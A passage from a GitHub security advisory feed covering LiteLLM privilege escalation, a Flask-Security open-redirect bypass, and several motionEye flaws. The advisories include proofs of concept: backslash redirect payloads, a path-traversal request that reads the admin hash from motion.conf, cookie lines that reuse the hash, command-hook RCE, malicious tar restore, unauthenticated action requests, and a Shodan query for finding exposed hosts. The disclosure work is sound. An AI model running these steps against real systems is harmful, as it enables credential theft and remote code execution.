(a) HTML-escaping of plain text nodes and (b) backtick-fence <strong>length</strong> for <code>&lt;pre&gt;</code> code <strong>blocks</strong>. Neither addresses a <strong>blank-line</strong> break of an <strong>inline</strong>  code span: fence length is irrelevant to a block-boundary break, and code-span bodies are not HTML-escaped. The cited dispatch and helper are unchanged at <code>v1.21.0</code>, and <code>origin/main == v1.21.0</code> (no embargoed fix).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-jf6w-2mvx-633j">https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-jf6w-2mvx-633j</a></li>
<li><a href="https://github.com/advisories/GHSA-jf6w-2mvx-633j">https://github.com/advisories/GHSA-jf6w-2mvx-633j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jf6w-2mvx-633j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-25T17:35:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM allows a user to modify their own user_role via the /user/update endpoint]]></title>
        <id>https://github.com/advisories/GHSA-wpfp-gwwc-vwq6</id>
        <link href="https://github.com/advisories/GHSA-wpfp-gwwc-vwq6"/>
        <updated>2026-06-23T22:48:11.000Z</updated>
        <content type="html"><![CDATA[<p>LiteLLM prior to 1.83.10 allows a user to modify their own user_role via the /user/update endpoint. While the endpoint correctly restricts users to updating only their own account, it does not restrict which fields may be changed. A user who can reach this endpoint can set their role to proxy_admin, gaining full administrative access to LiteLLM including all users, teams, keys, models, and prompt history. Users with the org_admin role have legitimate access to this endpoint and can exploit this vulnerability without chaining any additional flaw.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47102">https://nvd.nist.gov/vuln/detail/CVE-2026-47102</a></li>
<li><a href="https://github.com/BerriAI/litellm/pull/25541">https://github.com/BerriAI/litellm/pull/25541</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/128d32d2494b759c5d15da3452452af4c6a34c01">https://github.com/BerriAI/litellm/commit/128d32d2494b759c5d15da3452452af4c6a34c01</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/e6f18ce75b111c9b93dc15c72894cbdeb53177ce">https://github.com/BerriAI/litellm/commit/e6f18ce75b111c9b93dc15c72894cbdeb53177ce</a></li>
<li><a href="https://gist.github.com/13ph03nix/9ec616e1fdc77b3673509c60206e827f">https://gist.github.com/13ph03nix/9ec616e1fdc77b3673509c60206e827f</a></li>
<li><a href="https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable">https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable</a></li>
<li><a href="https://huntr.com/bounties/8e75edfb-ff05-4e63-bfca-2d93d03fb3b9">https://huntr.com/bounties/8e75edfb-ff05-4e63-bfca-2d93d03fb3b9</a></li>
<li><a href="https://www.vulncheck.com/advisories/litellm-privilege-escalation-via-user-update">https://www.vulncheck.com/advisories/litellm-privilege-escalation-via-user-update</a></li>
<li><a href="https://www.obsidiansecurity.com/blog/litellm-privilege-escalation-rce">https://www.obsidiansecurity.com/blog/litellm-privilege-escalation-rce</a></li>
<li><a href="https://github.com/advisories/GHSA-wpfp-gwwc-vwq6">https://github.com/advisories/GHSA-wpfp-gwwc-vwq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpfp-gwwc-vwq6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T21:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM allows an authenticated internal_user to create API keys with access to routes that their role does not permit]]></title>
        <id>https://github.com/advisories/GHSA-qrc4-49gv-mv9m</id>
        <link href="https://github.com/advisories/GHSA-qrc4-49gv-mv9m"/>
        <updated>2026-06-23T22:47:40.000Z</updated>
        <content type="html"><![CDATA[<p>LiteLLM prior to 1.83.14 allows an authenticated internal_user to create API keys with access to routes that their role does not permit. When generating a key, the allowed_routes field is stored without verifying that the specified routes fall within the user's own permissions. A key created with access to admin-only routes can then be used to reach those routes successfully, bypassing the role-based access controls that would otherwise block the request, enabling full privilege escalation from internal_user to proxy_admin.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47101">https://nvd.nist.gov/vuln/detail/CVE-2026-47101</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/2220f3076ac89bd2a2e3439acf57dcfbec2434c9">https://github.com/BerriAI/litellm/commit/2220f3076ac89bd2a2e3439acf57dcfbec2434c9</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/5190bd07eb23a037745d86328096f54378f1614a">https://github.com/BerriAI/litellm/commit/5190bd07eb23a037745d86328096f54378f1614a</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/d910a95661fce3cdd36f3b06c03ecf9c46c6457c">https://github.com/BerriAI/litellm/commit/d910a95661fce3cdd36f3b06c03ecf9c46c6457c</a></li>
<li><a href="https://gist.github.com/13ph03nix/9ec616e1fdc77b3673509c60206e827f">https://gist.github.com/13ph03nix/9ec616e1fdc77b3673509c60206e827f</a></li>
<li><a href="https://github.com/BerriAI/litellm/releases/tag/v1.83.14-stable">https://github.com/BerriAI/litellm/releases/tag/v1.83.14-stable</a></li>
<li><a href="https://huntr.com/bounties/8e75edfb-ff05-4e63-bfca-2d93d03fb3b9">https://huntr.com/bounties/8e75edfb-ff05-4e63-bfca-2d93d03fb3b9</a></li>
<li><a href="https://www.vulncheck.com/advisories/litellm-privilege-escalation-via-api-key-generation">https://www.vulncheck.com/advisories/litellm-privilege-escalation-via-api-key-generation</a></li>
<li><a href="https://www.obsidiansecurity.com/blog/litellm-privilege-escalation-rce">https://www.obsidiansecurity.com/blog/litellm-privilege-escalation-rce</a></li>
<li><a href="https://github.com/advisories/GHSA-qrc4-49gv-mv9m">https://github.com/advisories/GHSA-qrc4-49gv-mv9m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrc4-49gv-mv9m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Flask-Security] Flask-Security has an Open Redirect issue]]></title>
        <id>https://github.com/advisories/GHSA-w2j7-f3c6-g8cw</id>
        <link href="https://github.com/advisories/GHSA-w2j7-f3c6-g8cw"/>
        <updated>2026-06-23T22:46:32.000Z</updated>
        <content type="html"><![CDATA[<h1 id="open-redirect-in-flask-security">Open Redirect in Flask-Security</h1>
<h2 id="summary">Summary</h2>
<p><code>flask_security.utils.validate_redirect_url()</code> can allow an attacker-controlled redirect URL when subdomain redirects are enabled.</p>
<p>The bypass uses a backslash inside the URL authority/host:</p>
<pre><code class="language-text">http://evil.com\.whitelist.com
http://evil.com%5C.whitelist.com
</code></pre>
<p>Python's <code>urlsplit()</code> parses the full authority as <code>evil.com\.whitelist.com</code> or <code>evil.com%5C.whitelist.com</code>. Because the value ends with <code>.whitelist.com</code>, <code>validate_redirect_url()</code> accepts it as an allowed subdomain of <code>whitelist.com</code>.</p>
<p>This is similar in class to the previous Flask-Security-Too open redirect advisory CVE-2023-49438 / GHSA-672h-6x89-76m5, where crafted redirect URLs bypassed validation through browser URL normalization behavior.</p>
<h2 id="affected-configuration">Affected Configuration</h2>
<p>The issue requires subdomain redirects to be enabled:</p>
<pre><code class="language-python">SERVER_NAME = "whitelist.com"
SECURITY_REDIRECT_ALLOW_SUBDOMAINS = True
</code></pre>
<p>Tested environment:</p>
<pre><code class="language-text">Flask-Security: 5.8.0
Flask: 3.1.3
Werkzeug: 3.1.8
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker can craft a URL that passes Flask-Security's redirect validation and produces a <code>302</code> response to an attacker-controlled URL-like authority.</p>
<p>This can be used for phishing or other attacks that rely on a trusted application redirecting users to an attacker-controlled destination.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="poc-flask-app">PoC Flask App</h3>
<pre><code class="language-python">from __future__ import annotations

from importlib.metadata import version
from urllib.parse import urlsplit

from flask import Flask, jsonify, redirect, request

from flask_security.utils import validate_redirect_url


app = Flask(__name__)
app.config.update(
    SECRET_KEY="poc-only",
    SERVER_NAME="whitelist.com",
    SECURITY_REDIRECT_ALLOW_SUBDOMAINS=True,
    SECURITY_REDIRECT_BASE_DOMAIN=None,
    SECURITY_REDIRECT_ALLOWED_SUBDOMAINS=[],
)


@app.get("/")
def index():
    return jsonify(
        flask_version=version("Flask"),
        configured_server_name=app.config["SERVER_NAME"],
        examples=[
            r"http://evil.com\.whitelist.com",
            "http://evil.com%5C.whitelist.com",
            "http://sub.whitelist.com",
            "http://sub.not-whitelist.com",
        ],
    )


@app.get("/check")
def check():
    next_url = request.args.get("next", "")
    parsed = urlsplit(next_url)

    return jsonify(
        next=next_url,
        valid=validate_redirect_url(next_url),
        parsed={
            "scheme": parsed.scheme,
            "netloc": parsed.netloc,
            "hostname": parsed.hostname,
            "path": parsed.path,
        },
    )


@app.get("/redir")
def redir():
    next_url = request.args.get("next", "")
    if not validate_redirect_url(next_url):
        return jsonify(error="blocked", next=next_url), 400

    return redirect(next_url)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=False)
</code></pre>
<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
<p>Run the PoC with the target project's Flask version:</p>
<pre><code class="language-bash">.venv/bin/python poc_redirect_app.py
</code></pre>
<p>The invalid comparison case is correctly blocked:</p>
<pre><code class="language-bash">http://127.0.0.1:5000/redir?next=http://evil.com
</code></pre>
<p>Observed result:</p>
<img width="1019" height="294" alt="image" src="https://github.com/user-attachments/assets/de25ac4d-b37f-4369-928e-f44dfd5b7557">

<p>Check the validation result:</p>
<pre><code class="language-bash">http://127.0.0.1:5000/check?next=http://evil.com%5C.whitelist.com
</code></pre>
<p>Observed result:</p>
<img width="1029" height="634" alt="image" src="https://github.com/user-attachments/assets/8e5ec8a6-42a4-438a-8d12-a27724519091">

<h2 id="references">References</h2>
<ul>
<li>CVE-2023-49438: <a href="https://advisories.gitlab.com/pypi/flask-security-too/CVE-2023-49438/">https://advisories.gitlab.com/pypi/flask-security-too/CVE-2023-49438/</a></li>
<li>GHSA-672h-6x89-76m5: <a href="https://osv.dev/vulnerability/CVE-2023-49438">https://osv.dev/vulnerability/CVE-2023-49438</a></li>
<li>NVD entry for CVE-2023-49438: <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49438">https://nvd.nist.gov/vuln/detail/CVE-2023-49438</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/pallets-eco/flask-security/security/advisories/GHSA-w2j7-f3c6-g8cw">https://github.com/pallets-eco/flask-security/security/advisories/GHSA-w2j7-f3c6-g8cw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49438">https://nvd.nist.gov/vuln/detail/CVE-2023-49438</a></li>
<li><a href="https://advisories.gitlab.com/pypi/flask-security-too/CVE-2023-49438">https://advisories.gitlab.com/pypi/flask-security-too/CVE-2023-49438</a></li>
<li><a href="https://osv.dev/vulnerability/CVE-2023-49438">https://osv.dev/vulnerability/CVE-2023-49438</a></li>
<li><a href="https://github.com/advisories/GHSA-w2j7-f3c6-g8cw">https://github.com/advisories/GHSA-w2j7-f3c6-g8cw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w2j7-f3c6-g8cw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-23T22:46:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[motioneye] motionEye Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-phv5-334h-mxcw</id>
        <link href="https://github.com/advisories/GHSA-phv5-334h-mxcw"/>
        <updated>2026-06-23T19:09:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="partial-authentication-bypass-unauthenticated-admin-credential-theft-via-path-traversal">Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal</h1>
<h3 id="summary">Summary</h3>
<p>Myself and others have reported several RCE vulnerabilities to this project. However, due to the nature of the app, these are largely not of all that much value, as there is built-in functionality to run commands upon certain actions — i.e. RCE is by design.</p>
<p>With that in mind, I endeavored to find some sort of auth bypass, and was slightly successful.</p>
<p>When the admin password is set but the normal (surveillance) user password is left empty (the default), an unauthenticated attacker can exploit a path traversal vulnerability to read the motionEye configuration file from disk. This file contains the admin password as a SHA-1 hash, and that hash is accepted directly as a signing key for admin API requests — no cracking required. The result is full admin access from zero credentials.</p>
<p>This is a realistic scenario: many installations set an admin password to protect the settings UI but leave the normal user password empty so household members can view camera feeds without logging in.</p>
<h3 id="details">Details</h3>
<p>The vulnerability chains two independent issues:</p>
<p><strong>1. Unauthenticated normal-user access when <code>@normal_password</code> is empty</strong></p>
<p>In <code>motioneye/handlers/base.py</code>, lines 149-151:</p>
<pre><code class="language-python"># no authentication required for normal user
if not username and not normal_password:
    return 'normal'
</code></pre>
<p>When <code>@normal_password</code> is empty (the default — see <code>config.py</code> line 2251: <code>data.setdefault('@normal_password', '')</code>), any request without a <code>_username</code> parameter is silently granted <code>normal</code> user access. This is by design for convenience, but it means all normal-level endpoints are fully unauthenticated.</p>
<p><strong>2. Path traversal in <code>MoviePlaybackHandler</code> (and related handlers)</strong></p>
<p>The movie playback handler at <code>motioneye/handlers/movie_playback.py</code> serves recorded video files. It accepts a filename in the URL path:</p>
<pre><code>GET /movie/&lt;camera_id&gt;/playback/&lt;filename&gt;
</code></pre>
<p>The filename is passed to <code>mediafiles.get_media_path()</code> (<code>mediafiles.py</code> lines 497-500):</p>
<pre><code class="language-python">def get_media_path(camera_config, path, media_type):
    target_dir = camera_config.get('target_dir')
    full_path = os.path.join(target_dir, path)
    return full_path
</code></pre>
<p>When <code>path</code> is an absolute path (e.g. <code>/etc/motioneye/motion.conf</code>), Python's <code>os.path.join()</code> discards <code>target_dir</code> entirely and returns the absolute path as-is. This would normally be caught by Tornado's <code>StaticFileHandler</code> path validation, but <code>MoviePlaybackHandler</code> explicitly overrides both safety checks (<code>movie_playback.py</code> lines 111-115):</p>
<pre><code class="language-python">def get_absolute_path(self, root, path):
    return path

def validate_absolute_path(self, root, absolute_path):
    return absolute_path
</code></pre>
<p>This allows reading any file on the filesystem that the motionEye process can access.</p>
<p>The same path traversal exists in the movie download, picture download, and picture preview handlers:</p>
<ul>
<li><code>GET /movie/&lt;camera_id&gt;/download/&lt;filename&gt;</code></li>
<li><code>GET /picture/&lt;camera_id&gt;/download/&lt;filename&gt;</code></li>
<li><code>GET /picture/&lt;camera_id&gt;/preview/&lt;filename&gt;</code></li>
</ul>
<p><strong>3. Admin hash stored in a readable config file and accepted directly as a signing key</strong></p>
<p>motionEye stores the admin password as <code>SHA1(plaintext)</code> in its main configuration file (<code>motion.conf</code>), written as a comment line:</p>
<pre><code># @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db
</code></pre>
<p>The authentication code in <code>base.py</code> (lines 137-147) accepts signatures computed with <strong>either</strong> the raw stored hash or <code>SHA1(stored_hash)</code> as the signing key:</p>
<pre><code class="language-python">if username == admin_username and (
    signature == utils.compute_signature(
        self.request.method, self.request.uri, self.request.body, admin_password
    )
    or signature == utils.compute_signature(
        self.request.method, self.request.uri, self.request.body, admin_hash
    )
):
    return 'admin'
</code></pre>
<p>Here <code>admin_password</code> is the raw value from the config file (the SHA-1 hash), and <code>admin_hash</code> is <code>SHA1(admin_password)</code> — a hash of the hash. Since the stored value is already a SHA-1 hash, and it is accepted directly as a valid signing key, there is no need to crack it. The attacker can use the stolen hash immediately.</p>
<p>Furthermore, the client-side JavaScript (<code>static/js/main.js</code> line 3631) computes <code>sha1(plaintext_password)</code> and stores it in the <code>meye_password_hash</code> cookie as the signing key. This is the same value as <code>@admin_password</code> in the config file.</p>
<h3 id="poc">PoC</h3>
<p><strong>Step 1</strong> — Read the config file (unauthenticated, requires empty normal password):</p>
<pre><code>GET /movie/1/playback//etc/motioneye/motion.conf HTTP/1.1
Host: target:8765
</code></pre>
<p>Response contains:</p>
<pre><code># @admin_username admin
# @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db
</code></pre>
<p><strong>Step 2</strong> — Use the hash to become admin. In the browser console:</p>
<pre><code class="language-javascript">document.cookie = "meye_username=admin; path=/";
document.cookie = "meye_password_hash=7b7d55439abccf4ae83047c1af2707e6eb6664db; path=/";
location.reload();
</code></pre>
<p>The page reloads with full admin access. All subsequent requests are signed with the stolen hash.</p>
<p><strong>Step 3 (optional)</strong> — Achieve RCE via the admin config API. The admin can set <code>command_notifications_exec</code> or <code>command_storage_exec</code> to arbitrary shell commands, which are written into motion event hooks and executed by the motion daemon:</p>
<pre><code>POST /config/1/set HTTP/1.1
Content-Type: application/json

{"command_notifications_enabled": true, "command_notifications_exec": "touch /tmp/pwned", ...}
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Privilege escalation from zero credentials to full admin</strong> on any installation where the admin password is set but the normal user password is left empty (the default configuration).</li>
<li><strong>Arbitrary file read</strong> of any file readable by the motionEye process (typically running as <code>motion</code> user, or <code>root</code> on motionEyeOS). This includes <code>/etc/passwd</code>, <code>/etc/shadow</code> (if permissions allow), SSH keys, and application secrets.</li>
<li><strong>Full remote code execution</strong> — once admin access is obtained, the attacker can inject arbitrary shell commands via motion event hooks (<code>command_notifications_exec</code>, <code>command_storage_exec</code>, or <code>web_hook_storage_url</code>). Commands execute as the motion daemon user.</li>
<li><strong>Realistic attack surface</strong> — this is a common configuration for home surveillance setups where the admin password protects settings but camera feeds are left open for household members. Public instances are discoverable via Shodan (<code>http.favicon.hash:1898775751</code>).</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<ol>
<li>The path traversal should be fixed by validating that the resolved path stays within the camera's <code>target_dir</code>. Do not override <code>get_absolute_path</code> and <code>validate_absolute_path</code> to bypass Tornado's built-in protections. At minimum, reject absolute paths in the filename parameter.</li>
<li>Consider warning users in the UI when the normal user password is empty, as this makes all normal-level endpoints (including the vulnerable file handlers) fully unauthenticated.</li>
<li>The admin password hash should not be stored in a file that is served by the same file handlers used for media content. Alternatively, the <code>@</code> metadata lines should be moved to a separate configuration file that is not within any camera's media path.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/motioneye-project/motioneye/security/advisories/GHSA-phv5-334h-mxcw">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-phv5-334h-mxcw</a></li>
<li><a href="https://github.com/advisories/GHSA-phv5-334h-mxcw">https://github.com/advisories/GHSA-phv5-334h-mxcw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phv5-334h-mxcw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-23T19:09:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[motioneye] motionEye: LFI → pass‑the‑hash admin → unsafe restore → unauth action exec (RCE)]]></title>
        <id>https://github.com/advisories/GHSA-qxvg-h7q2-hcxh</id>
        <link href="https://github.com/advisories/GHSA-qxvg-h7q2-hcxh"/>
        <updated>2026-06-23T18:53:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A multi‑stage chain in motionEye leads to remote code execution. The chain combines:</p>
<ol>
<li><strong>Arbitrary file read (LFI)</strong> via the picture download endpoint for <strong>local motion cameras</strong> using absolute paths.</li>
<li><strong>Pass‑the‑hash admin auth</strong> due to accepting request signatures computed with password hashes.</li>
<li><strong>Unsafe config restore</strong> that extracts attacker‑controlled tarballs into <code>CONF_PATH</code>.</li>
<li><strong>Unauthenticated action execution</strong> via <code>/action/&lt;id&gt;/&lt;action&gt;</code>.</li>
</ol>
<p>If the <strong>normal user password is unset</strong>, the chain becomes <strong>unauthenticated RCE</strong>. If a normal password exists, a <strong>normal user</strong> can still achieve <strong>admin escalation and RCE</strong>.</p>
<hr>
<h2 id="affected-code-motioneye-repo">Affected Code (motionEye repo)</h2>
<h3 id="1-lfi-absolute-path--pictureiddownload">1) LFI (absolute path) — <code>picture/&lt;id&gt;/download</code></h3>
<p><strong>Files:</strong></p>
<ul>
<li><code>motioneye/motioneye/handlers/picture.py</code> → <code>download()</code> (local motion camera branch)</li>
<li><code>motioneye/motioneye/mediafiles.py</code> → <code>get_media_content()</code></li>
</ul>
<p><strong>Issue:</strong> <code>get_media_content()</code> only blocks <code>..</code> and then joins <code>target_dir</code> with <code>path</code>. Absolute paths (e.g. <code>/etc/hosts</code>) bypass the join and are read directly.</p>
<h3 id="2-passthehash-admin-auth">2) Pass‑the‑hash admin auth</h3>
<p><strong>File:</strong> <code>motioneye/motioneye/handlers/base.py</code> → <code>get_current_user()</code></p>
<p><strong>Issue:</strong> The signature check allows signatures computed using the <strong>admin password hash</strong> (SHA1) as the key. If the hash is leaked (via LFI), admin access can be obtained without the plaintext password.</p>
<h3 id="3-unsafe-restore-tar-extraction">3) Unsafe restore (tar extraction)</h3>
<p><strong>File:</strong> <code>motioneye/motioneye/config.py</code> → <code>restore()</code></p>
<p><strong>Issue:</strong> <code>tar zxC CONF_PATH</code> is used on user‑supplied data without sanitizing entries. A crafted tar can drop executable files into <code>CONF_PATH</code>.</p>
<h3 id="4-unauthenticated-action-execution">4) Unauthenticated action execution</h3>
<p><strong>File:</strong> <code>motioneye/motioneye/handlers/action.py</code> → <code>post()</code></p>
<p><strong>Issue:</strong> No authentication decorator is present. It executes <code>&lt;action&gt;_&lt;camera_id&gt;</code> found in <code>CONF_PATH</code> with <code>subprocess.Popen</code>.</p>
<hr>
<h2 id="exploit-chain-detailed">Exploit Chain (Detailed)</h2>
<ol>
<li><strong>Create or find a local motion camera id</strong> (local motion cameras are required for the vulnerable LFI path).</li>
<li><strong>LFI via picture download</strong>:<ul>
<li>Request: <code>/picture/&lt;id&gt;/download/&lt;absolute_path&gt;</code></li>
<li>Example: <code>/picture/1/download/%2Fetc%2Fhosts</code></li>
<li>Result: Arbitrary file read.</li>
</ul>
</li>
<li><strong>Read admin hash</strong> from <code>/etc/motioneye/motion.conf</code>:<ul>
<li>Contains <code>@admin_password &lt;SHA1_HASH&gt;</code>.</li>
</ul>
</li>
<li><strong>Pass‑the‑hash admin</strong>:<ul>
<li>Compute signature for <code>/config/restore?_username=admin</code> using the <strong>hash</strong> as key.</li>
<li>Admin access is accepted with hash‑based signatures.</li>
</ul>
</li>
<li><strong>Restore malicious tar</strong>:<ul>
<li>Upload a tar containing <code>lock_&lt;id&gt;</code> (or any action) as an executable.</li>
<li>File is written into <code>CONF_PATH</code> by restore.</li>
</ul>
</li>
<li><strong>Trigger unauth action</strong>:<ul>
<li>POST <code>/action/&lt;id&gt;/lock</code></li>
<li>The server executes the injected file.</li>
</ul>
</li>
</ol>
<hr>
<h2 id="proof-of-execution-observed-output">Proof of Execution (Observed Output)</h2>
<p>In local testing, the injected action created a marker file:</p>
<pre><code>/tmp/meye_rce_ok
</code></pre>
<p>Verification command:</p>
<pre><code>docker exec -it motioneye ls -la /tmp | grep meye_rce_ok
</code></pre>
<p>Example output:</p>
<pre><code>-rw-r--r-- 1 root root 0 ... /tmp/meye_rce_ok
</code></pre>
<hr>
<h2 id="preconditions--requirements">Preconditions / Requirements</h2>
<ul>
<li>At least <strong>one local motion camera</strong> exists (e.g., <code>netcam_url</code>, <code>videodevice</code>).</li>
<li><code>picture/&lt;id&gt;/download</code> is reachable:<ul>
<li><strong>Unauth</strong> if <code>@normal_password</code> is empty (default in some installs).</li>
<li><strong>Auth required</strong> if normal password is set (attacker needs normal creds).</li>
</ul>
</li>
</ul>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Unauth RCE</strong> (normal password unset).</li>
<li><strong>Authenticated RCE</strong> (normal user → admin → RCE).</li>
<li>Arbitrary file read on server filesystem.</li>
<li>Full compromise of motionEye process account.</li>
</ul>
<hr>
<h2 id="suggested-fixes">Suggested Fixes</h2>
<ol>
<li><strong>Block absolute paths</strong> in <code>get_media_content()</code> and <code>get_media_path()</code>.</li>
<li><strong>Remove hash‑based signature acceptance</strong>; only accept signatures computed with plaintext passwords.</li>
<li><strong>Harden restore</strong>: reject absolute paths, <code>..</code>, symlinks, non‑regular files.</li>
<li><strong>Require authentication</strong> on <code>ActionHandler</code> (admin‑only).</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/motioneye-project/motioneye/security/advisories/GHSA-qxvg-h7q2-hcxh">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-qxvg-h7q2-hcxh</a></li>
<li><a href="https://github.com/advisories/GHSA-qxvg-h7q2-hcxh">https://github.com/advisories/GHSA-qxvg-h7q2-hcxh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxvg-h7q2-hcxh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-23T18:53:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[motioneye] motionEye's missing authentication on ActionHandler allows unauthenticated camera action execution]]></title>
        <id>https://github.com/advisories/GHSA-j67x-q29f-qcvv</id>
        <link href="https://github.com/advisories/GHSA-j67x-q29f-qcvv"/>
        <updated>2026-06-23T18:37:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>ActionHandler.post()</code> method in motionEye has no authentication decorator, allowing any unauthenticated attacker to trigger camera actions including snapshots, recording start/stop, and configured action scripts (PTZ controls, alarm triggers, etc.).</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p><strong>File</strong>: <code>motioneye/handlers/action.py</code> — <code>ActionHandler.post()</code> line 36
<strong>CWE</strong>: CWE-862 — Missing Authorization
<strong>CVSS</strong>: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N = 5.3 Medium</p>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<pre><code class="language-python">class ActionHandler(BaseHandler):
    async def post(self, camera_id, action):   # ← NO @BaseHandler.auth() decorator
        camera_id = int(camera_id)
        if camera_id not in config.get_camera_ids():
            raise HTTPError(404, 'no such camera')
        ...
        if action == 'snapshot':
            await self.snapshot(camera_id)   # executed without auth
            return
        elif action == 'record_start':
            return self.record_start(camera_id)
        elif action == 'record_stop':
            return self.record_stop(camera_id)

        action_commands = config.get_action_commands(local_config)
        command = action_commands.get(action)
        ...
        self.run_command_bg(command)   # executes predefined shell scripts
</code></pre>
<p>Compare with other handlers that correctly require authentication:</p>
<pre><code class="language-python">@BaseHandler.auth(admin=True)   # ← properly protected
async def delete(self, camera_id, filename):
    ...
</code></pre>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Deploy motionEye with at least one camera configured</li>
<li>Send unauthenticated POST:</li>
</ol>
<pre><code>POST /action/1/snapshot HTTP/1.1
Host: motioneye-host:8765
Content-Length: 0
</code></pre>
<ol start="3">
<li>Observe <code>{}</code> (HTTP 200) response — snapshot triggered without any credentials</li>
</ol>
<p>For action scripts (<code>lock</code>, <code>unlock</code>, <code>alarm_on</code>, <code>alarm_off</code>, <code>light_on</code>, etc.):</p>
<pre><code>POST /action/1/alarm_on HTTP/1.1
Host: motioneye-host:8765
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li>Unauthenticated attacker can trigger camera snapshots on demand</li>
<li>Unauthenticated attacker can start/stop video recording</li>
<li>If action scripts are configured by admin: attacker can trigger PTZ movement, alarm control, lighting changes — physical security bypass</li>
<li>Via remote cameras: SSRF by triggering action on a remote motionEye server</li>
</ul>
<h2 id="verification">Verification</h2>
<p>Dynamically confirmed on v0.43.1 in Docker lab — <code>POST /action/2/snapshot</code> with no credentials returns HTTP 200 <code>{}</code>. Server log shows the action was processed (failed only because motion daemon was not running for the test camera, not due to an auth rejection).</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<pre><code class="language-python">class ActionHandler(BaseHandler):
    @BaseHandler.auth()   # add authentication requirement
    async def post(self, camera_id, action):
        ...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j67x-q29f-qcvv">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j67x-q29f-qcvv</a></li>
<li><a href="https://github.com/advisories/GHSA-j67x-q29f-qcvv">https://github.com/advisories/GHSA-j67x-q29f-qcvv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j67x-q29f-qcvv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-23T18:37:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[motioneye] motionEye's Absolute Path Traversal in Media File Handlers Allows Arbitrary File Read]]></title>
        <id>https://github.com/advisories/GHSA-rw9q-97r9-8gvh</id>
        <link href="https://github.com/advisories/GHSA-rw9q-97r9-8gvh"/>
        <updated>2026-06-23T18:34:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>mEye contains an absolute path traversal vulnerability in multiple media file handlers that allows an attacker to read arbitrary files from the filesystem.</p>
